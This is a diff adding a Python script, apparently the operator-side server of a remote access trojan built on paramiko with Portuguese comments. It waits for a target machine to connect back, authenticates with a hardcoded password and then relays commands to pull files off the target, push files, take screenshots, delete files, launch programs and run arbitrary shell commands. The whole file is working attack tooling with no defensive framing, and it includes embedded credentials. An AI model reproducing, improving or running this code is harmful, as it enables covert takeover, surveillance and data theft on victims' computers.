@@ -1,0 +1,202 @@
+#!/usr/bin/python3
+
+## se voce estiver no windows 
+
+import threading
+import sys
+import os
+import socket
+import paramiko
+from time import *
+class Server(paramiko.ServerInterface):
+	def __init__(self):
+		self.event = threading.Event()
+	def check_channel_request(self, kind, chanid):
+		if kind == "session":
+			return paramiko.OPEN_SUCCEEDED
+		return paramiko.OPEN_FAILED
+	def check_auth_password(self, username, password):
+		if password == "paraquedas123@" and username == "rablidad":
+			return paramiko.AUTH_SUCCESSFUL
+		return paramiko.AUTH_FAILED
+
+############ some global vars ##############
+key = paramiko.RSAKey(filename="/home/rablidad/paramiko/demos/user_rsa_key")
+host = "192.168.1.31"  # "192.168.0.20" ## usar ip externo, fazendo redirecionamento de porta de IP
+port = 5555
+############################################
+############################################
+foto = 1
+############################################
+######### FUNCTIONS DECLARATIONS ###########
+def help_cmd():
+    print("\ngetf <filename>\t\t\t - get a file from the target to your machine.")
+    print("\nsndf <filename>\t\t\t - send a file from your computer to the target.")
+    print("\nscreenshot     \t\t\t - take a screenshot of the target machine activity.")
+    print("\nsysteminfo     \t\t\t - system information about the target machine.")
+    print("\ncd <directory> \t\t\t - change from one directory to another on the target machine.")
+    print("\ndel <filename> \t\t\t - delete a file, archive, from the target machine.")
+    print("\nrm <filename>  \t\t\t - remove a file, archive, directory. (only available in some windows machine).")
+    print("\nstart <executable> <*args> \t - open a executable on the target machine (it pops up the executable GUI on the target machine).")
+    print("\nexplorer <directory> \t\t - open a directory on the target machine (it pops up the directory on the target machine).")
+    print("\npython(3)    \t\t\t - execute a python script on the target machine (replaces the current python script running with another on the target machine).")
+    print("----\nTable:\n\t '*' Optional.")
+
+def main():
+	try:
+		s = socket.socket()
+		s.bind((host, port))
+		s.listen(100)
+		print("[*] Aguardando conexão.")
+		conn, addr = s.accept()
+	except socket.error as e:
+		print(e)
+
+	print("[+] Conexão recebida!")
+
+	try:
+		ssh = paramiko.Transport(conn)
+		ssh.add_server_key(key)
+		servidor = Server()
+		try:
+			ssh.start_server(server=servidor)
+			echan = ssh.accept(20)
+			target_sys = echan.recv(1024)
+			if(target_sys == b'win32' or target_sys == b'cygwin'):
+				windows_target(ssh, echan, s, conn)
+			else:
+				linux_target(ssh, echan, s, conn)
+		except Exception as bea:
+			print("[-] Server Side Error: " + str(bea))
+
+	except Exception as ba:
+		print("[-] Server Side Error: " + str(ba))
+
+
+
+
+
+def windows_target(ssh, echan, s, conn):
+	global foto
+	try:
+		while True:
+			try:
+				cmd = str(input("> "))
+				if cmd == 'exit':
+					echan.send("exit")
+					echan.close()
+					ssh.close()
+					conn.close()
+					s.close()
+					sys.exit(0)
+				elif cmd == 'h':
+					help_cmd()
+					continue
+				elif cmd == "systeminfo":
+					echan.send(cmd)
+					sys_info = echan.recv(65536).decode('utf-8').split('\n')
+					for i in sys_info:
+						print(i)
+					continue
+				else:
+					if cmd[:4] == 'sndf':
+						try:
+							with open(cmd[5:], 'r') as file_to_send:
+								echan.send(cmd)
+								buffer_file = file_to_send.read()
+								echan.send(buffer_file)
+								file_resp = echan.recv(1024).decode('utf-8')
+								print(file_resp)
+							continue
+						except Exception as file_n:
+							print("[-] Server Side Error: " + str(file_n))
+							continue
+					elif(cmd[:4] == "getf"):
+						echan.send(cmd)
+						file_rp = echan.recv(1024).decode('utf-8')
+						if file_rp == 'ok':
+							with open("/home/rablidad/hack/transfer/" + cmd[5:], 'w+') as file_to_create:
+								to_insert_in_file = echan.recv(65536).decode('ISO-8859-1')
+								file_to_create.write(to_insert_in_file)
+							status = echan.recv(1024).decode('utf-8')
+							print(status)
+							continue
+
+						else:
+							print(file_rp)
+							continue
+
+					elif cmd[:3] == "del" or cmd[:2] == 'rm':
+						echan.send(cmd)
+						del_response = echan.recv(1024).decode('utf-8')
+						print(del_response)
+						continue
+					else:
+						if(cmd[:6] == 'python' or cmd[:7] == 'python3'):
+							echan.send(cmd)
+							path_to_execute = str(input("PATH_DO_ARQUIVO: "))
+							echan.send(path_to_execute)
+							sleep(2)
+							echan.close()
+							ssh.close()
+							s.close()
+							main()
+						elif(cmd[:8] == "explorer"):
+							echan.send(cmd)
+							print("[+] Opening Directory.")
+							continue
+
+						else:
+							if(cmd == 'screenshot'):
+								echan.send(cmd)
+								pasta = str(input("PASTA: "))
+								echan.send(pasta)
+								foto_resp = echan.recv(1024).decode('utf-8')
+								print(foto_resp)
+								if foto_resp == "ok":
+									buf_to_file = b""
+									with open("/home/rablidad/hack/screenshots/screenshot" + str(foto) + ".png", "wb") as image_file:
+										foto_len = echan.recv(1024).decode('utf-8')
+										print(int(foto_len))
+										print(len(buf_to_file))
+										print("[*] Pressione CTRL-C para terminar.")
+										while(len(buf_to_file) <= int(foto_len)):
+											try:
+												print(len(buf_to_file))
+												buf_to_file += echan.recv(4194304)
+											except KeyboardInterrupt:
+												print("\n[+] Arquivo Preenchido.")
+												break
+										image_file.write(buf_to_file)
+									foto+=1
+								else:
+									print(echan.recv(1024).decode('utf-8'))
+							else:
+								echan.send(cmd)
+								client_stdout_stderr = echan.recv(65536).decode('utf-8').split('\n')
+								for i in client_stdout_stderr:
+									print(i)
+			except KeyboardInterrupt:
+				print("[-] Desligando Servidor.")
+				echan.send("exit")
+				ssh.close()
+				conn.close()
+				s.close()
+				sys.exit(0)
+
+	except Exception as err:
+		print("Server Side Exception: " + str(err))
+		echan.send("exit")
+		echan.close()
+		ssh.close()
+		conn.close()
+		s.close()
+		sys.exit()
+
+
+
+def linux_target(ssh, echan, s,conn):
+	pass
+
+
+main()
